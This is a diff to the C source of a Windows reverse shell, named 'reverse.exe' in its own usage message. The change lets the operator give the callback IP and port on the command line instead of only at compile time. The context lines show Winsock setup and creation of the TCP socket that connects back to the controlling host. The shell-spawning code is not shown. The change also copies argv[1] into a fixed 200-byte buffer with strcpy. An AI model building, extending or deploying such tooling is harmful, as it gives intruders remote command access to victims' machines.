@@ -16,11 +16,27 @@
 #endif
 /* ================================================== */
 
-int main(void) {
-	if (strcmp(CLIENT_IP, "0.0.0.0") == 0 || CLIENT_PORT == 0) {
+int main(int argc, char **argv) 
+{
+	char clientIp[200];
+	int port = CLIENT_PORT;
+	memset(clientIp, 0, sizeof(clientIp));
+	strcpy(clientIp, CLIENT_IP);
+
+	printf("usage: reverse.exe ip port\n");
+
+	if(argc >= 3)
+	{
+		strcpy(clientIp, argv[1]);
+		port = atoi(argv[2]);
+	}
+
+	if (strcmp(clientIp, "0.0.0.0") == 0 || port == 0) {
 		write(2, "[ERROR] CLIENT_IP and/or CLIENT_PORT not defined.\n", 50);
 		return (1);
 	}
+
+	printf("start with %s and %i\n", clientIp, port);
 
 	WSADATA wsaData;
 	if (WSAStartup(MAKEWORD(2 ,2), &wsaData) != 0) {
@@ -28,7 +44,6 @@ int main(void) {
 		return (1);
 	}
 
-	int port = CLIENT_PORT;
 	struct sockaddr_in sa;
 	SOCKET sockt = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
 	sa.sin_family = AF_INET;
